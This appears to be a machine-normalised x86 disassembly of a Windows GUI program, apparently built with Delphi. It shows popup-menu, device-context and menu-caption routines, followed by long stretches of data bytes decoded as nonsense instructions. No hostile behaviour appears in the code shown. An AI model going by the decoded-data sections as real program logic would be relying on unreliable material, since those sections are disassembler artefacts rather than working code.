mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
jmp r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_41a238
mov edx [ ebp - 0x20 ]
mov edx [ edx + 0xc ]
mov cl 0x1
call sub_453658
mov [ ebp - 0xc ] eax
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_41a238
mov eax [ eax + 0x34 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
cmp [ ebp - 0xd ] 0x1
jne r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_41a238
mov cl [ ebp - 0xd ]
mov edx [ ebp - 0x8 ]
call sub_453658
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_41a238
mov [ ebp - 0x2c ] eax
mov eax [ ebp - 0x2c ]
mov edx [ eax ]
call [ edx + 0x34 ]
cmp eax [ esi + 0x8 ]
je r-xdata
inc edi
dec ebx
jne r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_41a238
mov edx [ ebp - 0x20 ]
mov edx [ edx + 0x8 ]
mov cl 0x1
call sub_453688
test eax eax
jne r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_41a238
mov edx [ eax ]
call [ edx + 0x34 ]
mov edx [ ebp - 0x20 ]
cmp eax [ edx + 0xc ]
jne r-xdata
jmp r-xdata
mov edx [ rw-data ]
mov edx [ edx ]
mov edx [ edx + 0x6c ]
test edx edx
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_41a238
mov edx [ ebp - 0x20 ]
mov edx [ edx + 0xc ]
xor ecx ecx
call sub_453688
test eax eax
jne r-xdata
mov ecx [ rw-data ]
test [ edx + 0x228 ] 0x8
je r-xdata
mov eax [ rw-data ]
mov eax [ edx + 0x158 ]
mov edx [ rw-data ]
mov edx [ edx ]
xchg edx eax
call sub_460504
jmp r-xdata
mov edx [ rw-data ]
mov edx [ edx ]
mov ecx eax
mov eax 0x8
xchg edx eax
call sub_46056c
jmp r-xdata
sub_45489b
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
push eax
call ReleaseDC
retn
sub_454954
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
mov edx esi
mov eax ebx
call sub_41a0dc
pop esi
pop ebx
retn
push ebx
push sub_4543c4
call sub_420d24
mov [ ebx + 0x10 ] eax
sub_454998
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_453470
mov [ esi + 0x58 ] 0xffffffff
mov [ esi + 0x5c ] 0xffffffff
mov eax [ esi + 0x34 ]
mov [ eax + 0x8c ] esi
mov edx [ esi ]
mov edx [ edx + 0x3c ]
mov [ eax + 0x88 ] edx
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x30 ]
mov [ esi + 0x38 ] eax
mov [ esi + 0x61 ] 0x1
mov edx esi
mov eax [ rw-data ]
call sub_454954
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403570
mov eax esi
pop esi
pop ebx
retn
call sub_4035c8
pop [ fs : 0x0 ]
add esp 0xc
sub_454a0c
push ebx
push esi
call sub_4035d8
mov ebx edx
mov esi eax
mov edx esi
mov eax [ rw-data ]
call sub_45497c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_45350c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035c0
sub_454a64
push ebx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop ebx
retn
cmp [ ebx + 0x41 ] 0x0
je r-xdata
lea eax [ ebx + 0x58 ]
call sub_44f808
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov dl [ eax + 0x34 ]
mov eax ebx
call sub_454178
mov [ ebx + 0x41 ] 0x1
mov dl [ eax + 0x5f ]
mov eax ebx
call sub_454178
mov [ ebx + 0x41 ] 0x1
jmp r-xdata
sub_454aac
push esi
xor edx edx
mov ecx [ rw-data ]
cmp [ ecx + 0xd ] 0x0
je r-xdata
mov eax edx
pop esi
retn
cmp [ eax + 0x41 ] 0x0
je r-xdata
cmp [ eax + 0x30 ] 0x1
sete dl
add eax 0x58
call sub_44f808
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45f008
mov edx eax
jmp r-xdata
mov si 0xffc8
call sub_403448
mov edx eax
jmp r-xdata
sub_454af8
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov ecx esp
mov edx edi
mov eax esi
call sub_418ddc
mov eax [ esp ]
mov [ ebx + 0x58 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x5c ] eax
mov eax ebx
call sub_454a64
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
xor edx edx
mov eax [ ebx + 0x34 ]
call sub_452dc4
xor edx edx
mov eax [ ebx + 0x34 ]
call sub_4532c0
mov eax [ ebx + 0x34 ]
call sub_450668
mov eax ebx
call sub_453c68
mov eax ebx
call sub_454aac
and eax 0x7f
lea eax [ eax + eax * 2 ]
lea eax [ eax * 2 + rw-data ]
xor edx edx
mov dl [ ebx + 0x60 ]
mov bp [ eax + edx * 2 ]
xor eax eax
mov al [ ebx + 0x68 ]
or bp [ eax * 2 + rw-data ]
movzx ebp bp
xor eax eax
mov al [ ebx + 0x69 ]
shl eax 0xa
or ebp eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x10 ]
push eax
push 0x0
push edi
push esi
push ebp
mov eax [ ebx + 0x34 ]
call sub_450798
push eax
call TrackPopupMenu
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_454bac
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_41a238
xor edx edx
mov [ eax ] edx
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_41a238
cmp ebp [ eax ]
jne r-xdata
sub_454be8
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0x15 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi edx
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x4
jg r-xdata
mov bl 0x1
mov eax [ rw-data ]
cmp [ eax ] 0x4
jne r-xdata
test bl bl
je r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor ebx ebx
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x0
jg r-xdata
mov edx 0xff000004
mov eax [ edi + 0x14 ]
call sub_423720
mov edx 0xff000007
mov eax [ edi + 0xc ]
call sub_422f54
test [ ebp + 0x8 ] 0x80
je r-xdata
mov edx 0xff00000d
mov eax [ edi + 0x14 ]
call sub_423720
mov edx 0xff00000e
mov eax [ edi + 0xc ]
call sub_422f54
jmp r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xfff2
call sub_403448
mov edx [ r-xdata ]
call sub_4033d8
mov [ ebp - 0x5 ] al
test [ ebp + 0x8 ] 0x1
je r-xdata
mov edx 0xff000004
mov eax [ edi + 0x14 ]
call sub_423720
mov edx 0xff000011
mov eax [ edi + 0xc ]
call sub_422f54
jmp r-xdata
mov ax [ ebp + 0x8 ]
push eax
mov al [ ebp - 0x5 ]
push eax
lea ecx [ ebp - 0x15 ]
mov edx edi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x30 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
test bl bl
jne r-xdata
sub_454cd0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx ebx
call sub_403ff0
mov ebx 0x1
jmp r-xdata
mov eax [ esi ]
call sub_40425c
cmp ebx eax
jle r-xdata
mov eax [ esi ]
mov al [ eax + ebx - 0x1 ]
mov edx [ rw-data ]
mov ecx eax
and ecx 0xff
bt [ edx ] ecx
jae r-xdata
pop esi
pop ebx
retn
cmp al 0x26
jne r-xdata
inc ebx
jmp r-xdata
inc ebx
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax esi
mov ecx 0x1
mov edx ebx
call sub_4044fc
cmp ebx 0x1
jle r-xdata
mov eax [ esi ]
call sub_40425c
sub eax ebx
cmp eax 0x2
jl r-xdata
mov eax [ esi ]
cmp [ eax + ebx - 0x2 ] 0x28
jne r-xdata
mov eax [ esi ]
cmp [ eax + ebx + 0x1 ] 0x29
jne r-xdata
mov edx ebx
dec edx
mov eax esi
mov ecx 0x4
call sub_4044fc
jmp r-xdata
sub_454d64
push ebx
push esi
push edi
push ebp
mov ebp edx
mov esi eax
mov eax ebp
call sub_403f9c
mov ebx 0x1
mov eax esi
call sub_40425c
mov edi eax
cmp edi ebx
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
mov dl [ esi + ebx - 0x1 ]
and edx 0xff
bt [ eax ] edx
jae r-xdata
cmp [ esi + ebx - 0x1 ] 0x26
jne r-xdata
inc ebx
jmp r-xdata
inc ebx
cmp edi ebx
jge r-xdata
mov eax edi
sub eax ebx
dec eax
jl r-xdata
inc ebx
cmp [ esi + ebx - 0x1 ] 0x26
je r-xdata
mov eax ebp
mov dl [ esi + ebx - 0x1 ]
call sub_404184
sub_454dc8
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_454e21
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_454cd0
mov eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_454cd0
mov eax [ ebp - 0x8 ]
pop edx
call sub_40817c
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_454e28
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403fc0
retn
sub_454e30
adc al [ eax ]
add [ eax ] al
cwde
sub eax 0x921c0047
inc edi
add [ ebp + ebp - 0x6e43ffb9 ] dl
inc edi
add [ eax + 0x5400472d ] dl
xchg ecx eax
inc edi
add [ ebp + ebp - 0x6e6fffb9 ] cl
inc edi
add [ eax + 0x400472d ] cl
xchg ebp eax
inc edi
add [ ebp + ebp - 0x6e5fffb9 ] al
inc edi
add [ eax + 0x6800472d ] al
xchg ebx eax
inc edi
add [ ebp + ebp + 0x47 ] bh
add al al
xchg edx eax
inc edi
add [ eax + 0x2d ] bh
inc edi
add [ ebp + edx * 4 + 0x2d740047 ] dl
inc edi
add [ eax + 0x70004795 ] dl
sub eax 0x92680047
inc edi
add [ ebp + ebp + 0x47 ] ch
add [ eax - 0x6b ] dl
inc edi
add [ eax + 0x2d ] ch
inc edi
add [ edx * 4 + 0x2d640047 ] cl
inc edi
add al ch
xchg ebp eax
inc edi
add [ eax + 0x2d ] ah
inc edi
add [ eax + 0x5c004795 ] dh
sub eax 0x927c0047
inc edi
add [ eax + 0x2d ] bl
inc edi
add [ eax + 0x54004792 ] dl
sub eax 0x92e00047
inc edi
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_454f28
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_454f2f
retn
mov eax [ rw-data ]
call sub_40324c
mov eax [ rw-data ]
call sub_40324c
mov eax [ rw-data ]
call sub_40324c
mov eax rw-data
mov ecx 0x12
mov edx [ r-xdata ]
call sub_404a50
mov eax rw-data
call sub_403f9c
sub_454f34
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax sub_454e30
call sub_403d48
mov eax [ r-xdata ]
call sub_419a74
mov eax [ r-xdata ]
call sub_419b14
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_419ac0
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_419ac0
mov eax [ r-xdata ]
call sub_4199b8
mov dl 0x1
mov eax [ r-xdata ]
call sub_40321c
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_40321c
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_42a6ec
mov [ rw-data ] eax
sub_455020
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov [ eax + 0x45 ] ss
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + edx * 2 + 0x45 ] dh
add [ eax ] al
inc ecx
add [ esp + esi + 0x34a00040 ] dl
inc eax
add [ esp + esi + 0x34a80040 ] ah
inc eax
add [ esp + esi + 0x31e40040 ] bl
inc eax
add [ eax ] al
xor al [ eax ]
mov al 0xa7
inc ecx
add al al
test al 0x41
add al cl
test al 0x41
add [ eax + 0x73 ] dl
inc ebp
add [ ecx ] dl
jpe r-xdata
outsd
outsb
push ebx
imul edi [ edx + 0x65 ] r-xdata
sub [ eax ] al
add bh bh
je r-xdata
inc [ ecx ]
add [ 0x6f6c6f43 ] al
jb r-xdata
outsd
insb
push ebx
arpl [ edx + 0x6f ] si
insb
insb
inc edx
popad
add [ ecx ] al
outsb
je r-xdata
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax + eax ] 0x0
add [ eax ] al
inc eax
dec edi
inc ebp
add [ eax ] cl
add [ eax ] al
dec [ eax ]
add [ eax ] al
dec [ eax + 0x73 ]
inc ebp
add [ eax ] al
add [ eax ] al
or [ eax ] 0x0
add [ eax ] al
jb r-xdata
ror [ eax + edx * 2 + 0x11070045 ] 0x54
push ebx
insd
outsd
outsd
je r-xdata
popad
outsb
add [ gs : bx + si ] dl
outsd
insb
outsd
jb r-xdata
insb
inc edx
popad
jb r-xdata
adc [ eax ] al
sbb al [ eax ]
add bh bh
sbb al [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add eax [ eax ]
push es
dec ebp
popad
jb r-xdata
push esp
inc ebx
outsd
outsb
je r-xdata
arpl [ ebx + 0x5 ] bp
inc esi
outsd
jb r-xdata
add al [ eax ]
or [ ecx + 0x6e ] ecx
arpl [ edx + 0x65 ] si
insd
outsb
je r-xdata
add [ eax ] al
outsd
insb
push ebx
arpl [ edx + 0x6f ] si
insb
add [ eax ] al
[ 0x1ff0000 ]
push esp
adc [ eax ] al
xor [ eax ] al
add bh bh
insb
jpo r-xdata
pop es
add [ esi ] al
add [ eax ] al
adc [ eax ] al
or al 0x0
add bh bh
test al 0x7a
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add eax 0x6f500800
jae r-xdata
add [ eax + 0x8 ] al
push eax
inc ebp
add [ eax + eax * 4 + 0x41 ] dl
add [ 0x6f460500 ] cl
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add al 0x0
or edx [ eax + 0x61 ]
jb r-xdata
imul ebp [ esi ] 0x2c004010
add [ eax ] al
call [ eax + 0x100457a ]
outsb
je r-xdata
mov [ eax + 0x45 ] ss
add [ edi ] al
adc [ ebx + eax * 2 + 0x6f ] edx
jae r-xdata
add [ eax - 0x63ffbfcc ] ah
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + 0x52 ] dh
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or al [ eax ]
or [ eax + ebp * 2 + 0x75 ] edx
insd
bound edx [ ebx + 0x69 ]
jpe r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] eax
add eax 0x6c797453
push esp
adc [ eax ] al
cmp [ eax ] al
add bh bh
enter 0x457b 0x0
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
jae r-xdata
jb r-xdata
push eax
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + edx * 2 + 0x45 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
rol [ ebp + 0x44 ] 0x0
add [ edi ] ah
add [ eax ] dl
jb r-xdata
jbe r-xdata
dec esi
outsd
jb r-xdata
inc ebp
add [ eax ] cl
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
add [ eax ] dl
inc eax
add [ 0x1dff0000 ] bl
add [ eax ] al
inc [ ecx ]
push [ eax + 0x100457b ]
outsd
outsb
push esp
adc [ eax ] al
adc [ eax ] al
add bh bh
clc
jpo r-xdata
add [ eax ] al
or al [ edx + 0x75 ]
je r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + eax ] ah
add bh bh
xor [ edx + 0x45 ] bh
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + edx + 0x40 ] dl
inc ebx
outsd
push esp
add [ eax ] cl
add [ eax ] al
loopne r-xdata
inc ebp
sar bh 0x50
test [ ebp ] al
sub al 0x85
inc ebp
add [ eax - 0x7b ] dl
add [ edi + 0x7f080044 ] dh
inc ebp
add ah ah
inc eax
inc esp
add al ch
inc eax
inc esp
add [ eax + 0x4800443f ] ah
aas
inc esp
add al bh
imul eax [ eax + eax - 0x70 ] 0x49
inc esp
add ah ch
jge r-xdata
inc esp
add [ eax ] bl
push 0x44
add ah dl
push 0x44
add [ eax - 0x47ffbb9b ] bl
push 0x44
add [ ebp + eax * 4 + 0x45 ] dh
add [ eax + 0x7f ] cl
inc ebp
add [ eax + eax * 2 + 0x44 ] cl
add al bh
jle r-xdata
add [ eax ] al
daa
add [ edi + esi * 2 ] ch
inc esp
add [ eax + 0x76 ] bh
inc esp
add [ eax ] cl
test [ ebx ] sub_446c8c
lodsb [ esi ]
insb
inc esp
add [ ecx + ebp * 2 - 0x9afffbc ] cl
inc ebx
add [ esi + esi * 8 + 0x43 ] dl
add [ eax + 0x26 ] dl
inc esp
add [ esi + 0x44 ] bh
add [ ecx + eax - 0x833ffbc ] dl
inc ebx
add [ eax ] ah
add eax [ eax + eax - 0x68 ]
add al [ eax + eax - 0x54 ]
add eax 0x4580044
inc esp
add al al
inc ebp
inc esp
add ah ch
inc esp
add ah bl
cmpsd [ esi ] [ edi ]
inc ecx
add [ eax - 0x6bffbbdc ] al
add ah bh
popad
insb
or esi [ edi + 0x73 ]
dec ebp
imul ebp [ esi + 0x69 ] 0x657a696d
or esi [ fs : edi + 0x73 ]
dec ebp
popad
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] al
add al 0x53
imul edi [ edx + 0x65 ] r-xdata
xor al 0x0
add bh bh
mov al 0x7b
inc ebp
add [ ecx ] al
inc eax
add [ edi ] bl
add [ eax ] al
[ edi ]
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ esp + edi * 2 ] cl
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push es
add [ 0x676e6152 ] al
add [ gs : eax ] dl
push esi
jb r-xdata
outsd
insb
nop
sbb [ ebp + eax * 2 ] dl
pop es
adc al 0x54
push ebx
arpl [ edx + 0x6f ] si
insb
insb
imul ebp [ esi + 0x67 ] 0x436e6957
outsd
outsb
je r-xdata
outsb
push edi
imul ebp [ esi + 0x43 ] 0x72746e6f
inc ebp
add [ eax + ebp * 2 ] bh
inc esp
add [ ebx + ebp * 2 + 0x44 ] ah
add [ eax + 0x7f ] ch
inc ebp
add [ eax ] bl
add [ ebp ] 0x4c
test [ ebp ] al
push es
add [ 0x15011400 ] al
add [ eax + esi * 4 ] edi
in al dx
inc eax
call [ eax - 0x7c ]
inc ebp
add [ eax * 4 - 0x7aafffbb ] ch
clc
inc ebx
add [ eax - 0x53ffbbd5 ] ah
add [ eax + eax + 0x60 ] eax
add eax [ edx ]
dec eax
add [ edx ] al
inc eax
add [ edx ] al
push 0x44004203
jle r-xdata
xchg esp eax
insd
imul edi [ edx + 0x65 ] 0x6f460564
jb r-xdata
add [ ebx ] al
or al 0x54
inc edx
outsd
jb r-xdata
push ebx
arpl [ edx + 0x6f ] si
insb
insb
inc edx
popad
jb r-xdata
jb r-xdata
outsd
insb
add al 0x53
inc ebp
add [ eax + ecx * 8 + 0x43 ] al
add [ 0x6f460500 ] cl
jb r-xdata
inc edx
add [ eax ] cl
inc edx
add [ eax ] al
inc edx
add [ eax + 0x3 ] ch
inc edx
add [ esi + edi * 2 + 0x45 ] al
jae r-xdata
shl ecx 0x2
jb r-xdata
imul ebp [ esi + 0x43 ] 0x72746e6f
push esp
inc ebp
add [ ebx ] al
adc [ esi + eax * 2 + 0x6f ] dl
jb r-xdata
jb r-xdata
je r-xdata
add [ 0xffffffff90000000 ] al
jae r-xdata
or [ edx + esi * 2 + 0x61 ] dl
arpl [ ebx + 0x69 ] bp
outsb
add [ bx + si ] dl
inc eax
add [ eax + eax ] bl
add bh bh
sbb [ ebp + eax * 2 ] bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
or al 0x0
pop es
push esi
imul esi [ ebx + 0x69 ] 0x8d656c62
inc eax
add [ edx + edx * 2 + 0x45 ] dh
add [ ebx ] al
or al 0x54
push edi
imul ebp [ esi + 0x64 ] 0x7453776f
popad
je r-xdata
cld
inc ecx
add [ eax + 0x24004034 ] ch
inc edi
inc esp
add ah ah
xor [ eax ] eax
add [ edx ] dh
inc eax
add [ esi + edi * 2 + 0x76fc0045 ] bh
inc esp
rol [ ebx + edx * 2 ] 0x45
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bl
push esp
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bl
push ebx
inc ebp
add dh bh
push ebx
inc ebp
add [ edx + eax ] bl
add [ eax ] al
nop
les eax [ ebx ]
dec eax
add eax [ edx ]
mov al [ 0xffffffff9c004034 ]
add [ ebx ] al
add [ eax ] al
add ah dl
push ebp
inc ebp
add [ edx ] cl
imul edx [ ebx + 0x79 ] 0x6d657473
jae r-xdata
or [ ecx + 0x4f ] cl
je r-xdata
insb
add [ gs : eax ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + 0x5004554 ] dl
inc esi
outsd
inc edx
outsd
jb r-xdata
inc eax
add [ ecx ] al
jae r-xdata
lea eax [ eax ]
and al 0x55
inc ebp
add [ edi ] cl
or eax 0x73654449
imul esp [ edi + 0x6e ] 0x6f487265
insb
add [ gs : eax ] eax
add [ eax ] al
jb r-xdata
imul edi [ edx + 0x65 ] 0x656c6261
or [ edx + 0x73 ] ah
inc esp
imul esp [ ecx + 0x6c ] 0x620c676f
jae r-xdata
push eax
inc ebp
add [ eax ] cl
add al [ eax ]
inc [ eax ]
add [ ebp ] 0x1
add [ eax ] al
add [ eax - 0x80000000 ] al
or eax [ eax ]
or eax 0x7a726f48
push ebx
arpl [ edx + 0x6f ] si
insb
insb
inc edx
popad
jb r-xdata
add [ eax + 0x8004550 ] cl
or ah [ edx + 0x69 ]
dec ebp
bound ebp [ ecx + 0x4d ]
imul ebp [ esi + 0x69 ] 0x657a696d
dec [ ebp + 0x55880040 ]
inc ebp
add bh bh
insd
movsb [ edi ] [ esi ]
adc [ eax ] eax
add ecx eax
loope r-xdata
add [ ebx ] al
lea eax [ eax ]
mov [ ebp + 0x45 ] dl
or dl [ esi + eax * 2 + 0x6f ]
jb r-xdata
jae r-xdata
jb r-xdata
push esp
inc ebp
insb
inc esi
invd
dec ecx
dec edi
add bh bh
dec [ ebx + 0x455558c0 ]
add [ edi ] cl
outsd
imul esp [ edx + ecx * 4 ] 0x41
add [ ecx ] al
movsd [ edi ] [ esi ]
sbb eax 0x2bea1e43
out 0x4d eax
mov [ 0xfffffffffd45cc30 ] eax
das
mov cl 0xec
add eax 0x6d726f46
jae r-xdata
dec eax
outsd
outsd
insb
push edi
imul ebp [ esi + 0x64 ] 0x620d776f
jae r-xdata
add ah ah
test [ ebp ] eax
sub [ ebp + eax * 2 + 0x457f8800 ] al
add [ esp + edx * 2 ] dl
push ebx
arpl [ edx + 0x6f ] si
insb
insb
imul ebp [ esi + 0x67 ] 0x436e6957
outsd
outsb
je r-xdata
push eax
inc ebp
add [ edx + eax ] cl
add bh bh
adc [ ecx + 0x10045 ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
or al 0x0
or eax 0x74726556
dec edi
insd
imul edi [ edx + 0x65 ] 0x48696206
outsb
jne r-xdata
push ebx
je r-xdata
outsd
jb r-xdata
inc eax
add al bl
push ebp
inc ebp
push edx
rcl [ ecx ] 0x1
sahf
cmpsb [ esi ] [ edi ]
add [ eax ] ah
scasd [ edi ]
cmp eax 0x4605da82
int 0xda
push esp
inc ebp
add [ esi ] al
bound esi [ ebx + 0x4e ]
outsd
outsb
or [ gs : edx + 0x73 ] ah
push ebx
imul ebp [ esi + 0x67 ] 0x620a656c
jae r-xdata
add eax 0x90000000
inc eax
add [ edx * 2 + 0xd0f0045 ] ah
dec ecx
inc esp
jae r-xdata
push ds
0xa34de72b 0xcc30
imul edi [ edx + 0x65 ] 0x6c6f6f54
push edi
imul ebp [ esi + 0x5 ] 0x6d726f46
push cs
jo r-xdata
mov eax eax
sub [ esi + 0x45 ] dl
inc esi
outsd
jb r-xdata
popad
js r-xdata
bound ebp [ ecx + 0x4d ]
insb
add [ gs : eax ] eax
push eax
outsd
jb r-xdata
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ ebp + edx * 2 + 0x66080045 ] al
jae r-xdata
add [ eax ] eax
outsb
jb r-xdata
outsd
push ebx
arpl [ edx + 0x65 ] si
outsb
inc ebx
outsb
je r-xdata
add [ eax ] al
add eax [ eax ]
add [ eax ] al
fcom [ esi + 0x45 ]
inc esp
popa
jne r-xdata
jb r-xdata
insb
jns r-xdata
jae r-xdata
bound ebp [ ecx + 0x53 ]
jns r-xdata
outsd
jb r-xdata
jo r-xdata
je r-xdata
inc edx
arpl [ edi + 0x6e ] bp
add [ eax ] eax
add [ eax ] al
outsd
jb r-xdata
inc esi
outsd
or ah [ ebp + ebp * 2 + 0x4d ]
insd
push eax
jo r-xdata
jb r-xdata
je r-xdata
je r-xdata
add [ ecx ] cl
insd
inc esp
jae r-xdata
add [ eax ] al
add al bl
push esi
inc ebp
je r-xdata
outsb
insb
jns r-xdata
arpl [ edi + 0x6e ] bp
jae r-xdata
pshufw mm5 [ edi + 0x44 ] 0x65
jae r-xdata
jo r-xdata
inc esp
dec ecx
inc ebx
push 0x9646c69
jae r-xdata
add [ esi ] al
or al 0x54
shr [ eax ] 0x56
insb
je r-xdata
insb
jo r-xdata
push es
popad
insb
or ah [ esi + 0x73 ]
dec ebp
inc esi
outsd
dec ebp
popad
imul ebp [ esi + 0x46 ] 0x436d726f
outsd
outsb
add [ eax ] eax
add [ eax ] al
add [ edi ] al
add [ eax ] al
add [ esi + edx * 2 ] bh
inc ebp
add [ edx ] cl
jo r-xdata
push es
add eax 0x6d726f46
nop
insd
popad
jb r-xdata
adc [ eax + 0x6f ] dh
jo r-xdata
inc esi
outsd
jb r-xdata
jae r-xdata
add ecx [ edi ]
push esp
imul edi [ edx + 0x65 ] 0x796c6e4f
push ebp
inc ebp
add [ eax + r-xdata ] dl
add ecx [ ecx ]
push esp
aam 0x55
popad
dec ebp
je r-xdata
insd
imul edi [ edx + 0x65 ] 0x4d69620a
inc esp
dec ecx
inc esi
outsd
jb r-xdata
adc [ eax + 0x6f ] esi
jo r-xdata
outsb
or [ fs : eax + 0x6f ] esi
inc esp
popa
jne r-xdata
dec ebp
insd
jb r-xdata
jb r-xdata
jb r-xdata
inc esp
jae r-xdata
push edi
inc eax
add al al
outsb
popad
insb
or al 0x70
inc ebp
add [ esi ] al
jo r-xdata
push edi
inc ebp
add [ ebx ] al
or edx [ eax + edx * 2 + 0x72 ]
imul ebp [ esi + 0x74 ] 0x6c616353
add [ edx ] al
inc ebp
add [ ebx ] al
or al 0x54
inc ebx
insb
outsd
jae r-xdata
add [ eax ] al
add [ eax ] al
add eax [ eax ]
add [ eax ] al
je r-xdata
inc esp
jae r-xdata
add [ esi ] eax
jb r-xdata
or [ ebp + ebp * 2 + 0x50 ] esp
js r-xdata
push cs
je r-xdata
jb r-xdata
jo r-xdata
outsd
jb r-xdata
or esp [ esi + 0x73 ]
push ebx
je r-xdata
inc esp
popa
inc esp
popa
jne r-xdata
jne r-xdata
fcom [ esi + 0x45 ]
je r-xdata
add eax 0x6d726f46
jo r-xdata
add [ gs : eax ] eax
